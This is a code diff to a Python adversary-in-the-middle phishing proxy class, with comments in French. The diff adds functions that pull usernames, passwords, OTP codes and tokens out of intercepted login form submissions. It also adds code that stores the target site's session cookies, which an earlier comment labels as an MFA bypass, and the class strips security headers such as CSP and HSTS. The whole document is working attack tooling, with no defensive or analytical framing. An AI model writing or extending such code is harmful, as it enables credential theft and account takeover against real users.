@@ -4,6 +4,8 @@ from typing import Dict, Optional, Tuple
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
 from fastapi import Request, Response, HTTPException
+from core.session.session_manager import session_manager
+from urllib.parse import parse_qs
 
 class AiTMProxy:
     """
@@ -14,6 +16,7 @@ class AiTMProxy:
     def __init__(self):
         self.session: Optional[aiohttp.ClientSession] = None
         self.proxy_domain = "vantablack-proxy.com" # À configurer dynamiquement
+        self.session_manager = session_manager
 
     async def get_session(self) -> aiohttp.ClientSession:
         if self.session is None or self.session.closed:
@@ -23,12 +26,16 @@ class AiTMProxy:
             )
         return self.session
 
-    async def proxy_request(self, target_url: str, request: Request, body: bytes = None) -> Response:
+    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None) -> Response:
         """
         Proxy la requête vers le serveur cible et réécrit la réponse.
         """
         session = await self.get_session()
         
+        # Capture Credentials (POST)
+        if request.method == "POST" and session_id and body:
+            self._capture_credentials(session_id, body)
+
         # Nettoyage des headers (suppression de l'hôte d'origine, compression, etc.)
         headers = dict(request.headers)
         headers.pop("host", None)
@@ -51,6 +58,12 @@ class AiTMProxy:
                 content = await upstream_response.read()
                 response_headers = dict(upstream_response.headers)
                 
+                # Capture Cookies (Set-Cookie)
+                if session_id and "set-cookie" in response_headers:
+                    # Note: aiohttp combine les headers multiples, il faudrait parser proprement
+                    # Pour l'instant on capture tout le bloc
+                    self.session_manager.capture_cookies(session_id, {"raw_cookie": response_headers["set-cookie"]})
+                
                 # Suppression des headers de sécurité qui bloqueraient le framing/proxying
                 for h in ["content-security-policy", "x-frame-options", "strict-transport-security"]:
                     response_headers.pop(h, None)
@@ -63,9 +76,6 @@ class AiTMProxy:
                     response_headers.pop("content-length", None)
                     # response_headers["content-length"] = str(len(content)) # Pas obligatoire avec chunked
                 
-                # Capture des Set-Cookie (MFA Bypass)
-                # TODO: Stocker dans Redis via SessionManager
-                
                 return Response(
                     content=content,
                     status_code=upstream_response.status,
@@ -77,6 +87,31 @@ class AiTMProxy:
             # En prod, logger l'erreur discrètement
             print(f"[AiTM Error] {e}")
             raise HTTPException(status_code=502, detail="Upstream Error")
+
+    def _capture_credentials(self, session_id: str, body: bytes):
+        """
+        Analyse le corps de la requête pour extraire les identifiants.
+        """
+        try:
+            # Tentative de parsing form-urlencoded
+            decoded = body.decode('utf-8', errors='ignore')
+            parsed = parse_qs(decoded)
+            
+            # Mots clés à surveiller
+            sensitive_keys = ["user", "username", "login", "email", "password", "pass", "pwd", "otp", "code", "token"]
+            
+            captured = {}
+            for key, values in parsed.items():
+                if any(s in key.lower() for s in sensitive_keys):
+                    captured[key] = values[0] if values else ""
+            
+            if captured:
+                print(f"[AiTM] Credentials captured for session {session_id}: {captured}")
+                for k, v in captured.items():
+                    self.session_manager.capture_credential(session_id, k, v)
+                    
+        except Exception as e:
+            print(f"[AiTM Warning] Failed to parse POST body: {e}")
 
     def rewrite_html(self, html_content: bytes, base_url: str) -> bytes:
         """
